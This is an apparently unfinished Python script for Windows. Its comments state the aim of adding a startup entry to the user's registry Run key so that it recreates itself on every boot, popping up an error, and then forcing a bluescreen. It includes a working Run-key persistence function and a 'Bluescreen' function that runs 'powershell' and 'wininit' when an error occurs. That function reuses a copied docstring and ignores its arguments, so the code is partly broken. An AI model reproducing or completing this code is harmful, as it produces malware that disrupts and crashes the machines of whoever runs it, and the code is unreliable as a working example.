import winreg
#HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
#create key for startup, create key for bluescreen del, and remake on boot, wait 5 seconds pop up error then bluescreen, create backup wininit.
#  winreg.CreateKeyEx(key, sub_key, reserved=0, access=KEY_WRITE)
import os
from time import sleep
def set_run_key(key, value):
    """
    Set/Remove Run Key in windows registry.

    :param key: Run Key Name
    :param value: Program to Run
    :return: None
    """
    # This is for the system run variable
    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r'Software\Microsoft\Windows\CurrentVersion\Run',
        0, winreg.KEY_SET_VALUE)

    with reg_key:
        if value is None:
            winreg.DeleteValue(reg_key, key)
        else:
            if '%' in value:
                var_type = winreg.REG_EXPAND_SZ
            else:
                var_type = winreg.REG_SZ
            winreg.SetValueEx(reg_key, key, 0, var_type, value)
def Bluescreen(key, value):
    """
    Set/Remove Run Key in windows registry.

    :param key: Run Key Name
    :param value: Program to Run
    :return: None
    """
    try:
    # This is for the system run variable
      reg_key = winreg.OpenKey(
          winreg.HKEY_CURRENT_USER,
          r'Software\Microsoft\Windows\CurrentVersion\Run',
          0, winreg.KEY_SET_VALUE)
    except:
      import os
      os.system('powershell')
      os.system('wininit')
